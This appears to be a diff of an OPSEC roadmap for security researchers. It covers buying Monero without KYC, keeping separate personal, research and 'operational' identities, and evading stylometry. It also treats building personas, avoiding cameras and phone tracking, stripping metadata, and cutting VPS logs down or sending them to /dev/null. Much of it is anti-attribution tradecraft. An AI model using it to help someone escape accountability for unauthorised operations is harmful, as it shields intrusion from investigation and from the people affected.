+  First: acquire Bitcoin at a cash ATM. Then: trade BTC → XMR on Bisq.
+
+Option 2: Haveno (Monero-native DEX)
+  https://haveno.exchange
+  Monero-native decentralized exchange.
+  No KYC, no central server.
+  LocalMonero closed November 2024: Haveno is the replacement.
+
+Option 3: Atomic swap
+  Directly swap Bitcoin to Monero without an exchange intermediary.
+  Tools: https://unstoppableswap.net
+  Trustless, no third party, no registration.
+
+Option 4: Accept Monero for services/work
+  If you provide services and get paid in XMR: completely clean entry.
+```
+
+---
+
+#### Wallet Setup
+
+**Feather Wallet (recommended for desktop):**
+- Download: https://featherwallet.org
+- Open source, actively maintained
+- Supports subaddresses, coin control
+- Verify the signature before installing
+
+**Monero GUI Wallet (official):**
+- Download: https://www.getmonero.org/downloads/
+- Official wallet from the Monero project
+- Full node or remote node mode
+- Verify the signature before installing
+
+**Cake Wallet (mobile, GrapheneOS compatible):**
+- Download from F-Droid or https://cakewallet.com
+- Mobile Monero + Bitcoin wallet
+- Includes built-in swap (Monero.com integrated)
+
+**Key security practices:**
+```
+1. Write down your seed phrase (25 words) on paper.
+   Store it physically in a secure location.
+   Never in a cloud service, never in a text file, never photographed.
+
+2. Never enter your seed phrase into any website.
+   Not "to verify" your wallet. Not "to restore" through a web interface.
+   Legitimate wallets never require web entry of your seed.
+
+3. Use a dedicated wallet for operational payments.
+   Separate from any Monero you might hold for personal purposes.
+   Separate wallets = separate financial trails.
+
+4. Do not send Monero directly from your wallet to known KYC services.
+   If you need to cash out, use atomic swaps, Bisq, or Haveno.
+```
+
+---
+
+### IDENTITY COMPARTMENTALIZATION & STYLOMETRY
+
+> **Your identities must be completely separate. Not mostly separate. Completely. And your writing style is an identity fingerprint you probably haven't thought about.**
+
+---
+
+#### The Identity Matrix
+
+```
+┌─────────────────┬──────────────────────────────────────────────────┐
+│ PERSONAL        │ Real name. Real accounts. Personal email.         │
+│                 │ Real hardware (laptop, phone).                    │
+│                 │ Personal social media. Amazon. Banking.           │
+│                 │ NEVER touches security research of any kind.      │
+├─────────────────┼──────────────────────────────────────────────────┤
+│ RESEARCH        │ Pseudonym. Throwaway email. Research VMs.         │
+│                 │ CTFs. GitHub security repos. Security forums.     │
+│                 │ Bug bounty profiles. Conference registrations.    │
+│                 │ Never crosses back into personal identity.        │
+├─────────────────┼──────────────────────────────────────────────────┤
+│ OPERATIONAL     │ Fresh infrastructure per operation.               │
+│                 │ No reuse of IPs, domains, usernames, devices.    │
+│                 │ Destroyed completely after operation completes.   │
+│                 │ No crossover with research identity.              │
+└─────────────────┴──────────────────────────────────────────────────┘
+
+The cardinal rule: these identities never touch.
+Not from the same device. Not from the same IP. Not from the same browser.
+Not through the same email. Not through any mutual account.
+Not ever.
+```
+
+---
+
+#### What Burns Identity Compartmentalization
+
+| Failure | How It Works | How to Prevent |
+|---|---|---|
+| Username reuse | Same username on two platforms → trivially linked | Generate unique usernames per identity. Use a password manager to track them. |
+| Personal email for recovery | Research account uses personal email as backup → direct identity link | Dedicated throwaway email per identity. ProtonMail over Tor. |
+| Logging into personal accounts from research IP | Platform logs the login → IP links both identities | Separate physical machines or separate VMs with different network paths |
+| File metadata (documents) | Word, PDF, image files embed author name, timestamps, software version | Strip all metadata before sharing (see Metadata section) |
+| EXIF data in images | Photos contain GPS coordinates, camera model, timestamps | Strip EXIF before sharing any image (exiftool, mat2) |
+| Browser fingerprint consistency | Same fingerprint across identities → linked | Separate browser profiles, Tor Browser for operational identity |
+| Writing style matching | Your vocabulary, sentence structure, punctuation habits are consistent across identities | See Stylometry section below |
+| Same PGP key | Using the same GPG key for personal and research activity | Separate GPG keys per identity |
+| Payment linkage | Buying infrastructure from the same Bitcoin wallet as personal purchases | Strict financial separation with Monero |
+| Timezone metadata | Document or email timestamps reveal timezone → narrows geographic identity | Set research OS to UTC |
+
+---
+
+#### Stylometry - Your Writing is a Fingerprint
+
+Stylometry is the forensic analysis of writing style to identify authorship. Researchers have linked pseudonymous authors to their real identities through stylometric analysis: sentence length patterns, vocabulary diversity, punctuation habits, word frequency distribution, preferred transition phrases.
+
+**What stylometry can identify:**
+- Average sentence length
+- Vocabulary richness (ratio of unique words to total words)
+- Function word frequency (the, and, or, but, in; these are more distinctive than content words)
+- Preferred punctuation patterns (do you use Oxford commas? Em dashes?)
+- Capitalization habits
+- Common grammatical constructions
+- Characteristic phrases or idioms
+
+**Real examples:**
+- Ross Ulbricht was linked to Silk Road forum posts from 2011 through username analysis combined with writing style consistency
+- Multiple journalists and researchers have been deanonymized through stylometric analysis of their writing across pseudonymous and real-name publications
+- Academic papers have demonstrated 80-90% accuracy in attributing writing samples to authors with sufficient training data
+
+**Practical countermeasures:**
+
+```
+1. Maintain a different writing persona per identity.
+   Personal: your natural writing style.
+   Research: deliberately different: different sentence structure,
+             different punctuation habits, different vocabulary register.
+
+2. Concrete changes to make:
+   - Change your comma usage patterns (more or fewer commas)
+   - Change your sentence length distribution (shorter or longer average)
+   - Change your capitalization habits
+   - Avoid phrases you use characteristically in personal writing
+   - If you capitalize "Internet" personally, don't capitalize it operationally (or vice versa)
+   - If you use semicolons frequently personally, avoid them operationally
+
+3. AI-assisted rewrites (for non-real-time communications):
+   Write your technical content. Then ask an LLM to rewrite it
+   in a specific, consistent style that differs from your natural style.
+   Use the same style instruction each time for the same identity
+   (consistency within the identity, difference from your personal style).
+
+4. For real-time chat:
+   Abbreviation habits. Emoji use. Response timing.
+   All of these are potentially stylometric.
+   Develop consistent alternative habits per identity.
+
+5. Tools:
+   Anonymouth (academic tool for anonymizing writing): 
+   https://github.com/psal/anonymouth
+   Analyze your own writing and get recommendations for changes.
+```
+
+---
+
+#### Creating Operational Personas
+
+Each operational identity needs a coherent backstory that can withstand casual inspection.
+
+```
+Persona construction:
+- Name: realistic for the claimed geographic/cultural origin
+- Background: consistent claimed expertise, history, motivation
+- Writing style: documented and consistent (see Stylometry above)
+- Online presence: minimal but coherent: a persona with zero history is suspicious
+- Email: created over Tor, not linked to phone number, not linked to real identity
+- GitHub: if needed, clean repos that match the claimed expertise
+- Social media: minimum necessary for plausibility, no real personal connections
+
+What the persona should NOT include:
+- Your actual opinions on identifiable topics
+- Your real geographic details (even encoded)
+- Your real-world contacts (even through follows/mutual connections)
+- Any crossover with personal identity infrastructure
+```
+
+---
+
+### SECURE RESEARCH OS
+
+> **The operating system you run your research on determines what leaves traces, what can be recovered, and how exposed your activity is. Choose based on your threat model.**
+
+---
+
+#### The Options
+
+**Option 1: Whonix - Best Anonymization**
+
+Whonix uses a two-VM architecture:
+- **Whonix-Gateway:** Routes ALL traffic through Tor at the network level. Your workstation cannot access the internet except through the gateway. If an application in your workstation tries to connect directly (bypassing Tor), it fails.
+- **Whonix-Workstation:** Your work environment. Applications run here. Cannot leak your real IP regardless of application behavior.
+
+This model is powerful because it is **application-agnostic**: even a misconfigured application cannot bypass Tor, because the gateway does not give it a path to.
+
+Installation (run both VMs in VirtualBox or KVM):
+```
+Download both Whonix images from https://www.whonix.org/wiki/VirtualBox
+Verify signatures before importing.
+Import to VirtualBox: File → Import Appliance
+Start Gateway first, then Workstation.
+```
+
+**Use for:** Anonymous research, any activity where IP attribution is a primary concern.
+
+**Hardware requirement:** 8GB RAM minimum (Gateway ~512MB, Workstation ~2GB, host OS gets the rest).
+
+---
+
+**Option 2: Tails - Best Ephemeral (Leave No Trace)**
+
+Tails is an amnesic operating system. It boots from USB, routes all traffic through Tor, and leaves no trace on the host machine when shut down (everything runs in RAM and is wiped on power-off).
+
+Key properties:
+- Every session starts clean: no persistent browser history, no saved passwords, no leftover files (unless you use the Persistent Storage feature)
+- If the machine is seized mid-session after shutdown, there is nothing to analyze
+- Boots from USB; the host machine's internal drive is never touched
+- All traffic is Tor-routed by default
+
+Installation:
+```
+Download from https://tails.boum.org
+Verify the download (SHA256 + GPG signature: the site explains this)
+Flash to USB: tails-installer tool on the site, or use Etcher
+Boot from USB (hold Option on Mac during boot, F12 on most PCs)
+```
+
+**Use for:** High-sensitivity operations where leaving traces on hardware is unacceptable. Journalists, whistleblowers, operations where the machine might be seized.
+
+**Limitation:** Performance (everything runs in RAM), Tor latency, and some tasks are inconvenient without persistence.
+
+---
+
+**Option 3: Qubes OS - Best Compartmentalization**
+
+Qubes uses Xen hypervisor to run every application in isolated VMs (qubes). A compromised application cannot escape its qube. Your email client, browser, terminal, and development tools each run in separate environments.
+
+- Compartmentalize: research VM, personal VM, disposable VMs for untrusted files
+- Integrate Whonix: run Whonix VMs inside Qubes for Tor routing
+- Disposable qubes: open an untrusted file in a VM that is destroyed when you close it
+- Strong isolation: even if your browser is compromised, the attacker is trapped in the browser qube
+
+**Use for:** Daily driver for a security researcher who needs both strong compartmentalization and a functional working environment.
+
+**Hardware requirement:** 16GB RAM absolute minimum. 32GB recommended. Not every motherboard is compatible; check https://www.qubes-os.org/hcl/ before purchasing hardware.
+
+---
+
+**Option 4: Kali Linux - Best Tooling, No OPSEC**
+
+Kali has every security tool pre-installed. It is not designed for anonymous use. It fingerprints as "Kali Linux" to any service that checks User-Agent, OS details, or behavior.
+
+- Use for: CTFs, local lab work, tool development, anything where OPSEC is not a concern
+- Do NOT use for: anything where you need anonymity or where being identified as "Kali user" matters
+
+**Recommended pairing:** Kali in a VM on your research machine, with VPN + proxychains for any network activity.
+
+---
+
+**Option 5: ParrotOS Security - Kali Alternative**
+
+Similar to Kali in tooling, slightly lighter. Home edition is more OPSEC-friendly than Kali (fewer fingerprinting artifacts). Same recommendation: pair with VPN + Tor for any sensitive activity.
+
+---
+
+#### Recommendation Matrix
+
+| Use Case | Recommended OS |
+|---|---|
+| CTF practice, local labs, tool development | Kali/Parrot in VM |
+| Anonymous research, sensitive browsing | Whonix |
+| High-stakes ops, leave-no-trace | Tails on USB |
+| Full-time research workstation, compartmentalized | Qubes OS |
+| Mobile research | GrapheneOS (see Mobile OPSEC section) |
+
+---
+
+#### Baseline Hardening (Any Linux System)
+
+```bash
+# Full disk encryption: set this up at installation time
+# For Ubuntu/Debian: select "Encrypt the new Ubuntu installation" during install
+# For existing system: use LUKS
+
+# Check if disk is encrypted
+lsblk -o NAME,FSTYPE,MOUNTPOINT | grep -i crypt
+
+# Screen lock (set to short timeout: 5 minutes maximum)
+# GNOME:
+gsettings set org.gnome.desktop.session idle-delay 300
+gsettings set org.gnome.desktop.screensaver lock-enabled true
+gsettings set org.gnome.desktop.screensaver lock-delay 0
+
+# Firewall (deny incoming by default)
+apt install ufw
+ufw default deny incoming
+ufw default allow outgoing
+ufw enable
+
+# Disable unused services
+# List running services:
+systemctl list-units --type=service --state=running
+# Disable anything you don't need:
+systemctl disable avahi-daemon  # mDNS: usually unnecessary
+systemctl disable cups           # printing: if not needed
+
+# MAC address randomization (prevents tracking across networks)
+# Create: /etc/NetworkManager/conf.d/randomize-mac.conf
+[device]
+wifi.scan-rand-mac-address=yes
+
+[connection]
+wifi.cloned-mac-address=random
+ethernet.cloned-mac-address=random
+
+# Hostname randomization at boot
+hostnamectl set-hostname $(cat /proc/sys/kernel/random/uuid | cut -c1-8)
+
+# System timezone: UTC for research OS
+timedatectl set-timezone UTC
+```
+
+---
+
+### PHYSICAL OPSEC - THE LAYER MOST GUIDES IGNORE
+
+> **Network anonymization means nothing if your physical location is being logged, your face is on a surveillance camera, or your device's location is being triangulated by cell towers. Physical OPSEC is the final layer.**
+
+---
+
+#### Why Physical OPSEC Matters
+
+Aaron Swartz was caught because:
+1. His laptop was physically found plugged into a network closet
+2. Surveillance cameras recorded him there
+3. University network logs associated his device with the physical location
+
+The digital evidence would have been much harder to use without the physical placement. His digital trail was confirmed by his physical presence.
+
+---
+
+#### The Location Problem
+
+**Cell towers:** Every time your phone connects to a cell tower (which happens every few minutes whether you use the phone or not), the carrier logs your IMEI, IMSI, and the tower's location. This creates a continuous location record. If your phone is with you near a sensitive operation, that operation is physically associated with your device.
+
+**Your home is your identity:** Cell tower logs showing your device regularly at one location = your home. Your home is trivially linked to your real identity through lease, utility, tax records, etc.
+
+**Implications:**
+```
+1. Your personal phone must never be near sensitive operations.
+   Leave it at home. Or leave it in your car. Or in a Faraday bag.
+
+2. Your operational phone (if you have one) should never be powered on at your home.
+   Power it on only in locations you've chosen for the operation.
+
+3. Your operational laptop: be aware of whether it has a cellular chip.
+   Many modern laptops have embedded LTE: it will register to cell towers
+   even if you don't use it for data.
+```
+
+---
+
+#### Surveillance Camera Awareness
+
+In urban areas, surveillance cameras cover most public spaces: intersections, storefronts, transit stations, parking lots, ATMs. When selecting where to operate from:
+
+```
+Low-camera-density locations:
+- Residential neighborhoods with low commercial activity
+- Parks without buildings
+- Libraries (cameras typically internal, not external)
+- University campuses (complex camera environments: research ahead)
+
+High-camera-density locations (avoid for sensitive operations):
+- Commercial districts
+- Transit hubs (train stations, bus stations)
+- Bank ATMs and financial district areas
+- Government buildings
+- Locations near previous incidents (cameras get added after events)
+```
+
+---
+
+#### Operational Location Selection
+
+```
+Café / public WiFi OPSEC:
+- Choose cafés where you can sit with your back to the wall (screen not visible)
+- Do not use café WiFi without a VPN (the café logs your traffic and can see your device's MAC address)
+- Your physical presence at the café is logged by cameras and potentially by your device registering to the network
+- Use a MAC address that is different from your usual device MAC
+  (On Linux: ip link set dev wlan0 down && macchanger -r wlan0 && ip link set dev wlan0 up)
+- Use different cafés. Don't establish a pattern at the same location.
+- Pay for food/drinks with cash. Card payments link your identity to the location and timestamp.
+
+Pattern avoidance:
+- Do not always operate from the same location. Patterns are identifiable.
+- Do not operate from locations physically associated with your real identity
+  (near your workplace, near your home, near your gym; anything with a pattern)
+- Vary your routes if you travel to specific operation locations.
+
+Vehicle:
+- License plates are logged by ANPR (Automatic Number Plate Recognition) cameras
+  at intersections, parking lots, police vehicles. In many cities, coverage is dense.
+- Your car is registered to your real identity.
+- Do not park your personal vehicle at or near sensitive operation locations.
+```
+
+---
+
+#### Physical Device Security
+
+```
+Full disk encryption (non-negotiable):
+If your device is seized while powered off, FDE means the contents are unreadable.
+If your device is seized while powered on and logged in: the data is accessible.
+Practice: lock your screen whenever you step away. Even for 30 seconds.
+
+Cold boot attacks:
+RAM retains data for seconds to minutes after power-off. Specialized cold boot attacks
+can extract encryption keys from RAM. In practice: not a concern for most threat models.
+But know it exists.
+
+Firmware implants:
+Physical access to a device can result in firmware-level implants that persist
+through OS reinstalls. If you believe a device has been physically compromised:
+replace it, do not continue using it.
+
+Border crossing / seizure risk:
+In some jurisdictions, law enforcement can compel device unlock at borders.
+If crossing into such jurisdictions with sensitive data:
+- Wipe or leave sensitive devices at home
+- Or: use a clean travel device with minimal data
+- Cloud storage of encrypted data (re-download after crossing)
+- The "border laptop" pattern: dedicated clean machine for travel, sync only what you need
+
+Sticker cameras / shoulder surfing:
+In public spaces, be aware of who can see your screen.
+Privacy screen filters exist and work ($20-40, widely available).
+Use them when operating in public spaces.
+```
+
+---
+
+### METADATA - THE SILENT KILLER
+
+> **You can have perfect network anonymization and still burn your identity through a document you shared, an image you uploaded, or a file you distributed. Metadata is embedded in files and travels with them.**
+
+---
+
+### What Metadata Is
+
+Metadata is data about data. A Word document does not just contain your text; it contains author name, organization name, software version, creation date, modification date, and sometimes revision history. A JPEG photograph contains camera model, GPS coordinates, timestamp, and lens information. A PDF can contain author information, software that created it, timestamps, and embedded document properties.
+
+---
+
+#### Common Metadata Vectors
+
+| File Type | Typical Metadata | Risk |
+|---|---|---|
+| JPEG/PNG/image | EXIF: GPS, camera model, timestamp | GPS reveals physical location |
+| Word/DOCX | Author name, organization, creation date, revision history | Author field can contain real name |
+| PDF | Author, title, producer software, creation date | Author field, software version |
+| Audio/MP3 | ID3 tags: artist, album, recording location | Less common but present |
+| ZIP/archive | Timestamps, file paths, creator OS info | Path info can reveal username/home directory |
+| Video/MP4 | GPS, camera model, creation date | GPS reveals physical location |
+| Office documents | Tracked changes with author names | Prior author names in revision history |
+
+---
+
+#### Metadata Stripping Tools
+
+```bash
+# Install mat2 (Metadata Anonymisation Toolkit)
 apt install mat2
-mat2 file.docx                      # Any supported format
 
-# Network: prevent DNS leaks
-# Add to /etc/dhcp/dhclient.conf:
-supersede domain-name-servers 127.0.0.1;  # Route DNS through Tor
+# Strip metadata from a single file
+mat2 document.docx
+mat2 image.jpg
+mat2 presentation.pptx
 
-# Check your DNS leak: https://dnsleaktest.com
-# Check your IP/fingerprint: https://browserleaks.com
+# Strip from all files in a directory
+find /path/to/dir -type f | xargs -I {} mat2 {}
+
+# Check remaining metadata after stripping
+mat2 --check document.docx
+
+# ExifTool (more thorough, more formats)
+apt install libimage-exiftool-perl
+
+# Strip all EXIF from an image
+exiftool -all= image.jpg
+
+# View metadata before stripping (know what you are removing)
+exiftool image.jpg
+
+# Strip from all JPEGs in a directory
+exiftool -all= *.jpg
+
+# Strip from all files recursively
+exiftool -all= -r /path/to/directory
+
+# Verify stripping worked
+exiftool stripped_image.jpg | grep -i "gps\|author\|owner"
+# Should return nothing
+```
+
+**For PDFs specifically:**
+```bash
+# mat2 handles PDFs
+mat2 document.pdf
+
+# Alternative: qpdf
+apt install qpdf
+qpdf --linearize input.pdf output.pdf
+
+# Alternative: Ghostscript (reprocesses the entire PDF)
+gs -dBATCH -dNOPAUSE -sDEVICE=pdfwrite \
+   -dCompatibilityLevel=1.4 \
+   -sOutputFile=clean_output.pdf input.pdf
 ```
 
 ---
 
-#### **5. Secure Research OS**
-
-**Time:** 1 week | **Difficulty:** Medium | **Prerequisite:** Linux fundamentals
+#### The Metadata Workflow
 
 ```
-Options:
-1. Whonix (best anonymity): https://www.whonix.org
-   - Gateway routes ALL traffic through Tor at the network level
-   - Workstation can't talk to internet except through gateway
-   - Run both as VMs
+Before sharing ANY file:
+1. Open the file in its native application.
+   Remove author fields, change creation date, remove tracked changes.
 
-2. Tails (best ephemeral): https://tails.boum.org
-   - Amnesic: everything deleted on shutdown
-   - Boots from USB: no traces on host machine
-   - Tor-routed by default
+2. Strip metadata with mat2 or exiftool.
 
-3. Qubes OS (best compartmentalization): https://www.qubes-os.org
-   - Each application runs in isolated VM (qube)
-   - Compromise of one qube doesn't leak to others
-   - Hardware requirements: 16GB RAM minimum
+3. Verify with mat2 --check or exiftool.
 
-4. Kali Linux (best tools, worst anonymity): https://www.kali.org
-   - Use for CTFs and lab work, not for anonymous ops
-   - Pair with VPN + Tor if used operationally
+4. Share the stripped file, not the original.
 
-Recommendation:
-- Daily research: Kali or ParrotOS in VirtualBox
-- Anonymous research: Whonix or Tails
-- High-stakes ops: Qubes with Whonix qubes
+Before uploading ANY image:
+1. Strip EXIF with exiftool -all= image.jpg
+
+2. For maximum safety: screenshot the image
+   (a screenshot creates a new image with no inherited EXIF)
+   Then share the screenshot.
+
+3. Verify GPS is gone: exiftool image.jpg | grep -i GPS
+   Should return nothing.
 ```
 
 ---
 
-### Phase -1: Milestones Checklist
+### WHAT LOGS EXIST ON EVERY SYSTEM YOU TOUCH
 
-- [ ] Anonymous VPS acquired (Monero payment, accessed over Tor)
-- [ ] Anonymous domain registered
-- [ ] Redirector configured and tested
-- [ ] VPN acquired and audited
+> **If you understand what is being logged where, you know what evidence exists and how to minimize it. This section maps the logging reality you operate in.**
+
+---
+
+#### Your ISP's Logs
+
+Your Internet Service Provider logs:
+- Connection timestamps (when you connected, for how long)
+- IP address assignments (what IP you had at what time)
+- Volume of data transferred (not content, if using VPN, but traffic patterns)
+- DNS queries (if you use their DNS resolver: use encrypted DNS)
+- Possibly: URLs visited (deep packet inspection, varies by ISP and country)
+
+**Retention period:** Varies by country. EU Data Retention Directive requires 6–24 months. US: ISPs voluntarily retain 6 months to 2 years.
+
+**How to minimize:** Use a VPN. Use encrypted DNS (DoH or DoT). Your ISP sees VPN traffic, not destinations.
+
+---
+
+#### VPN Provider's Logs
+
+Depends entirely on the provider. Options:
+- Truly no-logs (audited): Mullvad, IVPN (only what they claim)
+- Connection metadata logs even with "no logs" policy: many providers
+- Full content logs: untrusted providers
+
+**Retention period:** If no logs: zero. If logging: varies.
+
+**How to minimize:** Choose audited no-log providers (see VPN section). Pay anonymously with Monero.
+
+---
+
+#### Tor Network Logs
+
+The Tor network is designed not to log. But:
+- **Entry guard (first hop):** Knows your real IP. Knows you are using Tor. Does not know your destination.
+- **Middle relay:** Knows the entry guard. Knows the exit node. Does not know your IP or destination.
+- **Exit node:** Knows the destination. Does not know your IP.
+- No single node knows both ends.
+
+**What can be logged by malicious nodes:** A malicious entry node + malicious exit node owned by the same adversary can attempt traffic correlation to de-anonymize you. This is a global passive adversary attack: powerful but practically difficult except for nation-state actors.
+
+---
+
+#### VPS / Server Logs
+
+When you run a VPS, it generates logs:
+- `/var/log/auth.log` - SSH login attempts, successful logins, source IPs
+- `/var/log/syslog` - System events
+- `/var/log/apache2/access.log` - Web server access with IP, timestamp, user-agent
+- `/var/log/apache2/error.log` - Web server errors
+- `journalctl` - Systemd journal
+
+**Minimizing your VPS logs:**
+
+```bash
+# Reduce log verbosity
+# In /etc/ssh/sshd_config:
+LogLevel QUIET
+
+# Clear logs periodically (do not do this carelessly; unusual log gaps are suspicious)
+# Better: ensure logs do not contain your real IP by connecting through Tor/VPN always
+
+# Configure rsyslog to reduce what is retained
+# In /etc/rsyslog.conf: reduce disk retention
+
+# For maximum cleanup: configure logs to /dev/null
+# BUT: this is itself suspicious if discovered and may not align with provider TOS
+```
+
+---
+
+#### Target System Logs
+
+When you scan or probe a target:
+- Web server access logs: your source IP, timestamp, request
+- IDS/IPS systems: may log and alert on scan patterns
+- WAF (Web Application Firewall): logs requests that match attack patterns
+- Application logs: login attempts, errors generated by your activity
+- SIEM (Security Information and Event Management): aggregated and correlated logs with alerting
+
+If you have authorization, these logs document your testing. If you do not have authorization, they document your crime.
+
+---
+
+#### Platform Logs (Discord, GitHub, etc.)
+
+Platforms you use in your research identity:
+- **GitHub:** Logs all actions. IP addresses. Timestamps. Cooperates with legal requests. Public repos are public.
+- **Discord:** Logs everything. Very cooperative with law enforcement. Not for operational comms.
+- **HackTheBox / TryHackMe:** Logs your activity, completion, timestamps. Lower concern but be aware.
+- **Reddit:** Logs IPs at account creation and login. Cooperates with legal requests.
+
+**If you use these for research identity:** Use them through VPN or Tor. Create accounts with your research email, not your personal email.
+
+---
+
+### PHASE -1 MILESTONES CHECKLIST
+
+Everything below must be complete before Phase 0. These are not suggestions. They are prerequisites.
+
+#### Legal & Threat Model Foundation
+- [ ] Read and understood legal framework (CFAA and your jurisdiction's equivalent)
+- [ ] Written personal threat model: named adversaries, named assets, named risk levels
+- [ ] Understand what authorization means and have a template for requesting it
+- [ ] Know what MLAT is and why it matters for infrastructure jurisdiction selection
+
+#### Communication Security
+- [ ] Signal installed and configured on operational device (disappearing messages set)
+- [ ] SimpleX Chat installed as backup / secondary secure comms
+- [ ] Understand why Telegram group chats are not encrypted
+- [ ] Personal communications completely separated from any research communications
+- [ ] GPG key pair generated for research identity (if using email)
+- [ ] WebRTC leak tested and disabled: https://browserleaks.com/webrtc
+
+#### Phone & Mobile OPSEC
+- [ ] GrapheneOS installed on dedicated research phone (if using dedicated device)
+- [ ] OR: clear protocol for keeping personal phone away from operational activity
+- [ ] PIN lock instead of biometric on research device
+- [ ] Location services configured: off by default, per-app permission
+- [ ] Cloud backup disabled on research device
+- [ ] Faraday bag sourced and tested
+
+#### Anonymous Infrastructure
+- [ ] Monero wallet set up (Feather Wallet) and tested
+- [ ] Know how to acquire Monero without KYC (Bisq or Haveno account set up)
+- [ ] Anonymous VPS acquired (Monero payment, accessed exclusively through Tor)
+- [ ] VPS hardened: non-root user, key auth only, UFW configured, password auth disabled
+- [ ] Anonymous domain registered (Njalla or equivalent)
+- [ ] Redirector configured and tested (Apache or Nginx)
+- [ ] Let's Encrypt certificate installed and auto-renewing
+
+#### Anonymization Stack
+- [ ] Audited VPN acquired (Mullvad, IVPN, or AirVPN) with Monero payment
+- [ ] VPN kill switch enabled and tested (disconnect VPN manually → traffic stops)
+- [ ] Tor installed and running (socks5 proxy on 127.0.0.1:9050)
+- [ ] proxychains4 configured with proxy_dns enabled
+- [ ] DNS leak test passed: https://dnsleaktest.com (no ISP DNS servers visible)
 - [ ] VPN → Tor chain operational and leak-tested
-- [ ] Monero wallet set up (Feather Wallet: https://featherwallet.org)
-- [ ] Research identity created: separate email, browser profile, persona
-- [ ] Metadata stripping workflow established
-- [ ] Research OS configured (Whonix, Tails, or Qubes)
-- [ ] Understand what logs exist on every system you touch (VPS logs, ISP logs, Tor exit logs)
 
-**OPSEC is ongoing, not a one-time setup. Reassess every operation.**
+#### Browser Fingerprinting
+- [ ] Run and understood: https://coveryourtracks.eff.org
+- [ ] WebRTC disabled in all research browsers
+- [ ] Tor Browser or Mullvad Browser for operational browsing
+- [ ] Separate browser profiles per identity (no cross-contamination)
+- [ ] No personal extensions in research browser profiles
+
+#### Cryptocurrency
+- [ ] Understand why Bitcoin is pseudonymous, not anonymous
+- [ ] Understand Monero's three privacy primitives (ring signatures, stealth addresses, RingCT)
+- [ ] Monero subaddresses configured per payment purpose
+- [ ] Know how to acquire Monero without KYC (tested, not just read)
+
+#### Identity Compartmentalization
+- [ ] Personal, Research, and Operational identities defined and documented
+- [ ] Research email created over Tor, not linked to real identity
+- [ ] Zero crossover between personal and research identities tested
+- [ ] Understand stylometry and have a plan for maintaining writing style separation
+
+#### Secure OS
+- [ ] Research OS chosen and installed (Whonix, Tails, or Qubes)
+- [ ] Full disk encryption enabled
+- [ ] MAC address randomization configured
+- [ ] System timezone set to UTC
+- [ ] Screen lock set to 5 minutes
+
+#### Physical OPSEC
+- [ ] Personal phone protocol established: never near sensitive operations
+- [ ] Understand cell tower location logging and IMEI tracking
+- [ ] Physical workspace chosen: back to wall, screen not visible, cash payment for space access
+- [ ] MAC address randomization working before connecting to any public WiFi
+
+#### Metadata
+- [ ] mat2 and exiftool installed
+- [ ] Metadata stripping workflow established and tested
+- [ ] Test: check a stripped file with exiftool and mat2 --check to confirm clean
+
+#### What You Know
+- [ ] Can name what logs exist on: your ISP, your VPN, the Tor network, your VPS, target systems
+- [ ] Can explain what your threat model adversaries can realistically obtain
+- [ ] Can explain what each anonymization layer does and does not protect
+- [ ] Can explain why Monero is private and Bitcoin is not
+- [ ] Can explain why Tor Browser's default window size matters
+
+**OPSEC is ongoing. Reassess every operation. Reassess every month.**
+
+---
+
+### RESOURCES
+
+#### Threat Modeling
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [OPSEC for Security Researchers - DEF CON Talk](https://www.youtube.com/watch?v=oHSzqBPyN5I) | Video | 2 hours | Free | Start here. Practical. |
+| [The Grugq - OPSEC Tradecraft](https://www.youtube.com/results?search_query=grugq+opsec) | Video | 4 hours | Free | Multiple talks. The reference. |
+| [Threat Modeling Manifesto](https://www.threatmodelingmanifesto.org/) | Web | 1 hour | Free | Framework, not just checklist. |
+| [EFF Surveillance Self-Defense](https://ssd.eff.org) | Web | 3 hours | Free | Threat modeling fundamentals. |
+| [Security in a Box](https://securityinabox.org) | Web | 2 hours | Free | Practical tool guides per threat. |
+
+#### Communication Security
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Signal - Download](https://signal.org/en/download/) | App | - | Free | Primary encrypted comms. |
+| [SimpleX Chat - Download](https://simplex.chat) | App | - | Free | No user IDs. |
+| [Session - Download](https://getsession.org) | App | - | Free | No phone number. |
+| [Briar - Download](https://briarproject.org) | App | - | Free | Tor-routed, offline-capable. |
+| [EFF Guide to Encryption](https://ssd.eff.org/module/what-should-i-know-about-encryption) | Web | 1 hour | Free | Foundational reading. |
+
+#### Mobile OPSEC
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [GrapheneOS](https://grapheneos.org) | OS | Setup: 1–2 hours | Free | Hardened Android for Pixel devices. |
+| [GrapheneOS Features](https://grapheneos.org/features) | Web | 1 hour | Free | Read before installing. |
+| [F-Droid](https://f-droid.org) | App Store | - | Free | Open source app store for Android/GrapheneOS. |
+| [Faraday Bags](https://www.amazon.com/s?k=faraday+bag+phone) | Hardware | - | $20–60 | Test before trusting. |
+
+#### Anonymous Infrastructure
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Njalla](https://njal.la) | Service | - | XMR accepted | Anonymous VPS + domain. |
+| [1984 Hosting](https://1984.hosting) | Service | - | XMR accepted | Iceland. Strong privacy laws. |
+| [CoinATMRadar](https://coinatmradar.com) | Web | - | Free | Find no-ID Bitcoin ATMs. |
+| [Bisq](https://bisq.network) | App | - | Free | Decentralized BTC → XMR exchange. |
+| [Haveno](https://haveno.exchange) | App | - | Free | Monero-native DEX. LocalMonero replacement. |
+| [Unstoppable Swap](https://unstoppableswap.net) | Web | - | Free | BTC → XMR atomic swap. |
+
+#### Anonymization Stack
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Tor Project](https://www.torproject.org) | Software | - | Free | Tor Browser + daemon. |
+| [Whonix](https://www.whonix.org) | OS | Setup: 1 hour | Free | Gateway + Workstation VMs. |
+| [Tails](https://tails.boum.org) | OS | Setup: 30 min | Free | USB-based, amnesic. |
+| [Mullvad VPN](https://mullvad.net) | Service | - | ~$5/month XMR | RAM-only, audited. |
+| [IVPN](https://www.ivpn.net) | Service | - | XMR accepted | Account number only, no email. |
+| [DNS Leak Test](https://dnsleaktest.com) | Web | - | Free | Test after every config change. |
+
+#### Browser Fingerprinting
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Cover Your Tracks - EFF](https://coveryourtracks.eff.org) | Web | - | Free | Test your fingerprint. |
+| [Browser Leaks](https://browserleaks.com) | Web | - | Free | Comprehensive leak testing suite. |
+| [Mullvad Browser](https://mullvad.net/en/browser) | Software | - | Free | Fingerprint-resistant, non-Tor speed. |
